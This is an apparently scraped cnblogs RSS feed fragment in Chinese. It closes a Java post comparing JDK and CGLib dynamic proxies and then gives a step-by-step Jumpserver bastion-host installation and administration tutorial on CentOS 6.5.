&lt;/span&gt;&lt;span&gt; 4&lt;/span&gt;         validateCallbackTypes = &lt;span&gt;true&lt;/span&gt;&lt;span&gt;;
&lt;/span&gt;&lt;span&gt; 5&lt;/span&gt;     }    &lt;span&gt;//&lt;/span&gt;&lt;span&gt;检查回调方法是否为空&lt;/span&gt;
&lt;span&gt; 6&lt;/span&gt;     &lt;span&gt;if&lt;/span&gt; (filter == &lt;span&gt;null&lt;/span&gt;) {    &lt;span&gt;//&lt;/span&gt;&lt;span&gt;检查是否设置过滤器，如果设置了多个回调方法就需要设置过滤器&lt;/span&gt;
&lt;span&gt; 7&lt;/span&gt;         &lt;span&gt;if&lt;/span&gt; (callbackTypes.length &amp;gt; 1&lt;span&gt;) {
&lt;/span&gt;&lt;span&gt; 8&lt;/span&gt;             &lt;span&gt;throw&lt;/span&gt; &lt;span&gt;new&lt;/span&gt; IllegalStateException(&quot;Multiple callback types possible but no filter specified&quot;&lt;span&gt;);
&lt;/span&gt;&lt;span&gt; 9&lt;/span&gt; &lt;span&gt;        }
&lt;/span&gt;&lt;span&gt;10&lt;/span&gt;         filter =&lt;span&gt; ALL_ZERO;
&lt;/span&gt;&lt;span&gt;11&lt;/span&gt; &lt;span&gt;    }
&lt;/span&gt;&lt;span&gt;12&lt;/span&gt; }
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　接着查看createHelper的剩余代码：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;41&quot;&gt;
&lt;pre&gt;
&lt;span&gt; 1&lt;/span&gt; &lt;span&gt;private&lt;/span&gt;&lt;span&gt; Object createHelper() {
&lt;/span&gt;&lt;span&gt; 2&lt;/span&gt; &lt;span&gt;    preValidate();
&lt;/span&gt;&lt;span&gt; 3&lt;/span&gt;     Object key = KEY_FACTORY.newInstance((superclass != &lt;span&gt;null&lt;/span&gt;) ? superclass.getName() : &lt;span&gt;null&lt;/span&gt;&lt;span&gt;,
&lt;/span&gt;&lt;span&gt; 4&lt;/span&gt; &lt;span&gt;            ReflectUtils.getNames(interfaces),
&lt;/span&gt;&lt;span&gt; 5&lt;/span&gt;             filter == ALL_ZERO ? &lt;span&gt;null&lt;/span&gt; : &lt;span&gt;new&lt;/span&gt; WeakCacheKey&amp;lt;CallbackFilter&amp;gt;&lt;span&gt;(filter),
&lt;/span&gt;&lt;span&gt; 6&lt;/span&gt; &lt;span&gt;            callbackTypes,
&lt;/span&gt;&lt;span&gt; 7&lt;/span&gt; &lt;span&gt;            useFactory,
&lt;/span&gt;&lt;span&gt; 8&lt;/span&gt; &lt;span&gt;            interceptDuringConstruction,
&lt;/span&gt;&lt;span&gt; 9&lt;/span&gt; &lt;span&gt;            serialVersionUID);
&lt;/span&gt;&lt;span&gt;10&lt;/span&gt;     &lt;span&gt;this&lt;/span&gt;.currentKey = key;        &lt;span&gt;//&lt;/span&gt;&lt;span&gt;在CGLib中也使用到了缓存机制，这段代码也比较复杂，有关缓存的策略暂时也不做分析吧 &lt;/span&gt;
&lt;span&gt;11&lt;/span&gt;     Object result = &lt;span&gt;super&lt;/span&gt;.create(key);    &lt;span&gt;//&lt;/span&gt;&lt;span&gt;利用字节实现并创建代理类对象&lt;/span&gt;
&lt;span&gt;12&lt;/span&gt;     &lt;span&gt;return&lt;/span&gt;&lt;span&gt; result;
&lt;/span&gt;&lt;span&gt;13&lt;/span&gt; }
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　马马虎虎地只能说是介绍了JDK与CGLib两种动态代理技术，并没有很深入地研究，特别是在两者在缓存机制上的实现，略感遗憾。&lt;/p&gt;
&lt;p&gt;　　另外，在开头提到了CGLib的性能比JDK高，这实际上并不准确。或许这在特别条件下的确如此，因为在我实测发现JDK8的动态代理效率非常高，甚至略高于CGLib，但是在JDK6的环境下的效率就显得比较低了。所以，通常所说的CGLib性能比JDK动态代理要高，是传统的挂念，实际上Java一直都在不断优化动态代理性能，在比较高版本的JDK条件下可以放行大胆的使用JDK原生的动态代理。&lt;/p&gt;


&lt;p&gt;&lt;strong&gt;这是一个能给程序员加buff的公众号 &lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/630246/201710/630246-20171018224424427-1683168589.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
</description>
<pubDate>Thu, 09 Nov 2017 15:12:00 +0000</pubDate>
<dc:creator>余林丰</dc:creator>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/yulinfeng/p/7811965.html</dc:identifier>
</item>
<item>
<title>Jumpserver部署与安装 - jks巴顿</title>
<link>http://www.cnblogs.com/jksbaduen/p/7811909.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/jksbaduen/p/7811909.html</guid>
<description>&lt;p&gt;&lt;span&gt;&lt;span&gt;完全开源，&lt;/span&gt;&lt;span&gt;GPL&lt;/span&gt;&lt;span&gt;授权&lt;/span&gt;&lt;span&gt; &lt;br/&gt;Python&lt;/span&gt;&lt;span&gt;编写，容易再次开发&lt;/span&gt;&lt;span&gt; &lt;br/&gt;&lt;/span&gt;&lt;span&gt;实现了跳板机基本功能，认证、授权、审计&lt;/span&gt;&lt;span&gt; &lt;br/&gt;&lt;/span&gt;&lt;span&gt;集成了&lt;/span&gt;&lt;span&gt;Ansible&lt;/span&gt;&lt;span&gt;，批量命令等&lt;/span&gt;&lt;span&gt; &lt;br/&gt;&lt;/span&gt;&lt;span&gt;支持&lt;/span&gt;&lt;span&gt;WebTerminal &lt;br/&gt;Bootstrap&lt;/span&gt;&lt;span&gt;编写，界面美观&lt;/span&gt;&lt;span&gt; &lt;br/&gt;&lt;/span&gt;&lt;span&gt;自动收集硬件信息&lt;/span&gt;&lt;span&gt; &lt;br/&gt;&lt;/span&gt;&lt;span&gt;录像回放&lt;/span&gt;&lt;span&gt; &lt;br/&gt;&lt;/span&gt;&lt;span&gt;命令搜索&lt;/span&gt;&lt;span&gt; &lt;br/&gt;&lt;/span&gt;&lt;span&gt;实时监控&lt;/span&gt;&lt;span&gt; &lt;br/&gt;&lt;/span&gt;&lt;span&gt;批量上传下载&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;&lt;span&gt;&lt;span&gt;相对于&lt;/span&gt; &lt;span&gt;jumpserver 2.0&lt;/span&gt; &lt;span&gt;版本，在新的版本&lt;/span&gt; &lt;span&gt;3.0&lt;/span&gt; &lt;span&gt;中取消了&lt;/span&gt;&lt;span&gt;LDAP&lt;/span&gt;&lt;span&gt;授权，取而代之的是&lt;/span&gt;&lt;span&gt;ssh&lt;/span&gt;&lt;span&gt;进行推送；界面也有所变化，功能更完善，安装更简单，不像&lt;/span&gt; &lt;span&gt;2.0&lt;/span&gt; &lt;span&gt;的版本，难住了好多人。下面通过两台主机来搭建&lt;/span&gt; &lt;span&gt;jumpserver&lt;/span&gt;&lt;span&gt;堡垒机！&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;span&gt;环境：&lt;/span&gt;&lt;span&gt; &lt;br/&gt;Centos 6.5 x86_64 &lt;br/&gt;&lt;/span&gt;&lt;span&gt;关闭&lt;/span&gt; &lt;span&gt;iptables&lt;/span&gt;&lt;span&gt;，关闭&lt;/span&gt; &lt;span&gt;selinux &lt;br/&gt;jumpserver&lt;/span&gt;&lt;span&gt;：&lt;/span&gt;&lt;span&gt;192.168.1.200 &lt;br/&gt;clients&lt;/span&gt;&lt;span&gt;：&lt;/span&gt;&lt;span&gt;192.168.1.210 &lt;br/&gt;ps&lt;/span&gt;&lt;span&gt;：操作只针对&lt;/span&gt; &lt;span&gt;jumpserver&lt;/span&gt;&lt;span&gt;，&lt;/span&gt;&lt;span&gt;clients&lt;/span&gt; &lt;span&gt;不会进行操作，只是环境需求。&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;
&lt;h2&gt;安装依赖包 &lt;/h2&gt;
&lt;/li&gt;
&lt;/ol&gt;&lt;ol readability=&quot;0.5&quot;&gt;&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;&lt;span&gt;yum -y install epel-release?&lt;/span&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;&lt;span&gt;yum clean all &amp;amp;&amp;amp; yum makecache?&lt;/span&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;span&gt;yum -y update?&lt;/span&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;0&quot;&gt;
&lt;p&gt;&lt;span&gt;yum -y install git python-pip mysql-devel gcc automake autoconf python-devel vim sshpass lrzsz readline-devel&lt;/span&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2&gt;二、下载 jumpserver &lt;br/&gt;cd /opt &lt;br/&gt;git clone &lt;a href=&quot;https://github.com/jumpserver/jumpserver.git&quot; target=&quot;_blank&quot;&gt;&lt;span&gt;https://github.com/jumpserver/jumpserver.git&lt;/span&gt;&lt;/a&gt; &lt;br/&gt;注： 如果下载失败，则去github上面下载zip包，unzip解压缩即可&lt;/h2&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/1265569/201711/1265569-20171109230339544-1677261301.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;strong&gt;三、执行快速安装脚本 &lt;br/&gt;cd /opt/jumpserver/install&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;strong&gt;pip install -r requirements.txt&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;strong&gt;注意 requirements.txt 有可能不在 install下 ，可以到上级目录中查找一下 或者用 find的在上级目录中查找&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/1265569/201711/1265569-20171109230340747-36098268.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;查看安装的包 pip freeze&lt;/p&gt;
&lt;p&gt;python install.py &lt;br/&gt;输入jumpserver的地址，默认为：&quot;&lt;span&gt;192.168.1.210&lt;/span&gt;&quot;，回车即可 &lt;br/&gt;是否安装MySQL：选择&quot;y&quot;进行安装&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/1265569/201711/1265569-20171109230341153-1449591510.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;MySQL 启动后会要求用户输入 邮件服务器及账户（后期用来发送用户名、ssh pass、web pass、ssh key）&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/1265569/201711/1265569-20171109230341888-662490864.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;输入smtp信息之后发现报错了，是python的pycrypto模块问题，需要卸载重装： &lt;br/&gt;pip uninstall pycrypto &lt;br/&gt;easy_install pycrypto&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/1265569/201711/1265569-20171109230342184-1712305773.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/1265569/201711/1265569-20171109230342450-1446825371.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/1265569/201711/1265569-20171109230342716-1936288924.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/1265569/201711/1265569-20171109230343013-1994034267.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;安装之后继续 python install.py 进行安装，并且输入 web管理员用户名和管理员密码，ok&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/1265569/201711/1265569-20171109230343997-1544018180.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/1265569/201711/1265569-20171109230344294-1835653147.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;运行 crontab，定期处理失效连接，定期更新资产信息 &lt;br/&gt;cd /opt/jumpserver &lt;br/&gt;python manage.py crontab add&lt;/p&gt;
&lt;p&gt;安装 Jinja模块&lt;/p&gt;
&lt;ol readability=&quot;-0.5&quot;&gt;&lt;li&gt;
&lt;p&gt;&lt;span&gt;cd /server/tools&lt;/span&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;0&quot;&gt;
&lt;p&gt;&lt;span&gt;wget https:&lt;span&gt;//pypi.python.org/packages/47/83/679b5592feb54e948d6599edf5dac61d2991778c3ecbef6b8041663f4740/Jinja2-2.7.1.tar.gz&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;&lt;span&gt;tar xf Jinja2-2.7.1.tar.gz&lt;/span&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;span&gt;cd Jinja2-2.7.1&lt;/span&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;span&gt;python setup.py install&lt;/span&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;配置端口&lt;/p&gt;
&lt;ol readability=&quot;-1&quot;&gt;&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;&lt;span&gt;cd /application/jumpserver/&lt;/span&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;&lt;span&gt;python manage.py runserver 0.0.0.0:8000&lt;/span&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;重启服务&lt;/p&gt;
&lt;ol readability=&quot;-2&quot;&gt;&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;&lt;span&gt;cd /application/jumpserver/&lt;/span&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;span&gt;./service.sh restart&lt;/span&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;jumpserver操作指南&lt;/p&gt;
&lt;p&gt;浏览器访问服务器http：&lt;span&gt;192.168.1.210&lt;/span&gt;使用之前设置的用户名和密码登陆。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/1265569/201711/1265569-20171109230344653-1035800190.jpg&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/1265569/201711/1265569-20171109230345747-1523238559.jpg&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;h2&gt;&lt;span&gt;&lt;span&gt;  &lt;/span&gt;一、用户管理&lt;/span&gt;&lt;/h2&gt;
&lt;p&gt;&lt;span&gt;&lt;span&gt;1&lt;/span&gt;&lt;span&gt;）添加用户&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;span&gt;点击用户管理&lt;/span&gt; &lt;span&gt;—&amp;gt;&lt;/span&gt; &lt;span&gt;查看用户&lt;/span&gt; &lt;span&gt;—&amp;gt;&lt;/span&gt; &lt;span&gt;添加用户&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/1265569/201711/1265569-20171109230346528-352940804.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;span&gt;输入要添加的用户名，姓名，权限，&lt;/span&gt;&lt;span&gt;Mail&lt;/span&gt;&lt;span&gt;，并且发送邮件&lt;/span&gt; &lt;span&gt;—&amp;gt;&lt;/span&gt; &lt;span&gt;保存&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/1265569/201711/1265569-20171109230347231-174091609.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;span&gt;查看添加的用户&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/1265569/201711/1265569-20171109230347934-1871033551.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;span&gt;查看用户邮件&lt;/span&gt;&lt;span&gt; &lt;br/&gt;&lt;/span&gt;&lt;span&gt;邮件中包含了用户名，权限，&lt;/span&gt;&lt;span&gt;web&lt;/span&gt;&lt;span&gt;密码，&lt;/span&gt;&lt;span&gt;ssh&lt;/span&gt; &lt;span&gt;密钥密码，以及密钥下载地址。&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/1265569/201711/1265569-20171109230348450-1935296304.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/1265569/201711/1265569-20171109230348700-938165572.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;span&gt;2&lt;/span&gt;&lt;span&gt;）添加用户组&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;span&gt;点击用户管理&lt;/span&gt; &lt;span&gt;—&amp;gt;&lt;/span&gt; &lt;span&gt;查看用户组&lt;/span&gt; &lt;span&gt;—&amp;gt;&lt;/span&gt; &lt;span&gt;添加用户组&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/1265569/201711/1265569-20171109230349091-1446713264.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/1265569/201711/1265569-20171109230349419-1993762805.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;span&gt;添加新的小组&lt;/span&gt; &lt;span&gt;—&amp;gt;&lt;/span&gt; &lt;span&gt;运维小组&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/1265569/201711/1265569-20171109230350466-884955907.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/1265569/201711/1265569-20171109230350731-148785624.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;span&gt;查看刚才添加的组&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/1265569/201711/1265569-20171109230351513-1754384469.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/1265569/201711/1265569-20171109230351794-1002436948.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;h2&gt;二、资产管理&lt;/h2&gt;
&lt;p&gt;&lt;span&gt;&lt;span&gt;1&lt;/span&gt;&lt;span&gt;）添加资产组&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;span&gt;点击资产管理&lt;/span&gt; &lt;span&gt;—&amp;gt;&lt;/span&gt; &lt;span&gt;查看资产组&lt;/span&gt; &lt;span&gt;—&amp;gt;&lt;/span&gt; &lt;span&gt;添加主机组&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/1265569/201711/1265569-20171109230352747-1157511898.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;span&gt;输入组名称，并且输入描述组用途&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/1265569/201711/1265569-20171109230353434-1474578274.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/1265569/201711/1265569-20171109230353638-1338982474.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;span&gt;2&lt;/span&gt;&lt;span&gt;）添加资产&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;span&gt;点击资产管理&lt;/span&gt; &lt;span&gt;—&amp;gt;&lt;/span&gt; &lt;span&gt;查看资产&lt;/span&gt; &lt;span&gt;—&amp;gt;&lt;/span&gt; &lt;span&gt;添加资产&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/1265569/201711/1265569-20171109230354044-1960088655.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;span&gt;输入主机名，主机&lt;/span&gt;&lt;span&gt;IP&lt;/span&gt;&lt;span&gt;，管理用户名（管理员用户，主机中必须存在的哦&lt;/span&gt;&lt;span&gt;~&lt;/span&gt; &lt;span&gt;可以是&lt;/span&gt;&lt;span&gt;root&lt;/span&gt;&lt;span&gt;），端口，资产组&lt;/span&gt; &lt;span&gt;—&amp;gt;&lt;/span&gt; &lt;span&gt;提交保存&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/1265569/201711/1265569-20171109230354606-358995597.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/1265569/201711/1265569-20171109230354809-395767668.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;span&gt;3&lt;/span&gt;&lt;span&gt;）添加机房&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;span&gt;点击资产管理&lt;/span&gt; &lt;span&gt;—&amp;gt;&lt;/span&gt; &lt;span&gt;查看机房&lt;/span&gt; &lt;span&gt;—&amp;gt;&lt;/span&gt; &lt;span&gt;添加机房&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/1265569/201711/1265569-20171109230355309-2103340920.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;span&gt;输入机房名称，其他的可以选填&lt;/span&gt; &lt;span&gt;—&amp;gt;&lt;/span&gt; &lt;span&gt;保存&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/1265569/201711/1265569-20171109230355809-263055566.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/1265569/201711/1265569-20171109230356278-41586503.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;h2&gt;三、权限管理&lt;/h2&gt;
&lt;p&gt;&lt;span&gt;&lt;span&gt;1&lt;/span&gt;&lt;span&gt;）&lt;/span&gt;&lt;span&gt;sudo&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;span&gt;点击权限管理&lt;/span&gt; &lt;span&gt;—&amp;gt; sudo —&amp;gt;&lt;/span&gt; &lt;span&gt;添加别名&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/1265569/201711/1265569-20171109230357013-1732197538.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;span&gt;输入别名，系统命令，备注&lt;/span&gt; &lt;span&gt;—&amp;gt;&lt;/span&gt; &lt;span&gt;点击保存&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/1265569/201711/1265569-20171109230357856-1626686997.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/1265569/201711/1265569-20171109230358044-2032199179.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;span&gt;2&lt;/span&gt;&lt;span&gt;）添加系统用户&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;span&gt;点击授权管理&lt;/span&gt; &lt;span&gt;—&amp;gt;&lt;/span&gt; &lt;span&gt;系统用户&lt;/span&gt; &lt;span&gt;—&amp;gt;&lt;/span&gt; &lt;span&gt;添加系统用户&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/1265569/201711/1265569-20171109230358763-347230106.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;span&gt;输入用户名，密码，管理的&lt;/span&gt;&lt;span&gt;sudo&lt;/span&gt;&lt;span&gt;及备注&lt;/span&gt; &lt;span&gt;—&amp;gt;&lt;/span&gt; &lt;span&gt;单击保存&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/1265569/201711/1265569-20171109230359497-1332074218.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;span&gt;创建好系统之后，单击推送，将用户名、密码、&lt;/span&gt;&lt;span&gt;sudo&lt;/span&gt;&lt;span&gt;的信息推送到服务器。&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/1265569/201711/1265569-20171109230400388-1377007185.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;span&gt;选择系统用户，资产组&lt;/span&gt; &lt;span&gt;—&amp;gt;&lt;/span&gt; &lt;span&gt;单击保存&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/1265569/201711/1265569-20171109230400950-469874680.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;span&gt;推送成功&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/1265569/201711/1265569-20171109230401184-1541809746.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/1265569/201711/1265569-20171109230401419-922325938.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;span&gt;3&lt;/span&gt;&lt;span&gt;）授权规则&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;span&gt;点击授权管理&lt;/span&gt; &lt;span&gt;—&amp;gt;&lt;/span&gt; &lt;span&gt;授权规则&lt;/span&gt; &lt;span&gt;—&amp;gt;&lt;/span&gt; &lt;span&gt;添加规则&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/1265569/201711/1265569-20171109230401903-1816476373.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;span&gt;输入授权名称，用户&lt;/span&gt;&lt;span&gt;/&lt;/span&gt;&lt;span&gt;用户组，资产&lt;/span&gt;&lt;span&gt;/&lt;/span&gt;&lt;span&gt;资产组，系统用户，备注&lt;/span&gt; &lt;span&gt;—&amp;gt;&lt;/span&gt; &lt;span&gt;单击保存&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/1265569/201711/1265569-20171109230402434-278237735.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/1265569/201711/1265569-20171109230402763-287770741.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;h2&gt;四、登录&lt;/h2&gt;
&lt;p&gt;&lt;span&gt;&lt;span&gt;这时候创建已经完成，下一步用户&lt;/span&gt;&lt;span&gt;&quot;hongxue&quot;&lt;/span&gt;&lt;span&gt;通过&lt;/span&gt;&lt;span&gt;web&lt;/span&gt;&lt;span&gt;和密钥登录堡垒机&lt;/span&gt; &lt;span&gt;192.168.1.200&lt;/span&gt;&lt;span&gt;，并实现跳转到服务器&lt;/span&gt; &lt;span&gt;192.168.1.210&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
